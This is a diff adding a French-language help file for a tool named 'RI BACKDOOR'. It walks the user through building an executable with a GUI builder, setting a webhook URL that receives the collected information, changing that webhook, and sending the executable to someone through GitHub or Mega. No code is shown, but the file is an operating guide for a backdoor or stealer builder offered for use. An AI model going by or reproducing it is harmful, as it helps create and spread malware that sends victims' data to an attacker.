@@ -1,0 +1,20 @@
+Bienvenue dans le fichier d'aide ->
+
+1.0 - Comment utiliser RI BACKDOOR >
+
+Premièrement déziper le dossier.
+Pour installer les modules nécessaire au fonctionnement, ouvrez une invite de commande, entrez dans le répertoire du dossier RIBACKDOOR, puis tapez la commande : pip install -r requierments.txt.
+Ensuite pour lancer l'interface, vous devez clicker sur le Builder.bat, si celui-ci ne fonctionne pas alors éxecuter directment le gui.py avec Visual Studio Code.
+Une fois dans l'interface, entrez votre url webhook et un nom de fichier (celui que vous souhaitez), puis clicker sur SAVE Webhooh si vous voulez le conserver dans le fichier webhook.txt, et BUILD Executable, passientez...
+Le fichier executable sera désormais dans le dossier dist du dossier RIBACKDOOR !
+
+1.1 - Gérer les différents problème >
+
+Changer le webhook :
+Si vous voulez changer d'url pour recevoir les informations sur un autre webhook, supprimer le contenue de la variable webhook_url dans le fichier classic.py à la ligne 46.
+Maintenant, vous pouvez relancer le Builder.bat mettre votre webhook, le sauvegarder puis créer votre éxecutable !
+La sauvegarde du fichier webhook.txt contien la dernière sauvegarde webhook éffectuée.
+
+Envoyer l'éxecutable :
+Pour envoyer l'éxecutable à quelqu'un il vous faudra le mettre soit sur GitHub, Mega, ou un autre stockage en ligne.
+Car le fichier éxecutable est trop lourd pour etre envoyé directement sur discord.
